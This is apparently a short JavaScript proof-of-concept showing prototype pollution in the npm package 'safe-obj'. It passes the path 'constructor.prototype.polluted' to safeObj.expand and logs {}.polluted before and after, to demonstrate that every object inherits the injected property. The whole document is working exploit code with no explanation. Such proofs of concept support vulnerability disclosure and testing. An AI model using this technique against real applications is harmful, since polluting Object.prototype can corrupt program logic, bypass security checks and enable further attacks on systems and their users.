var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);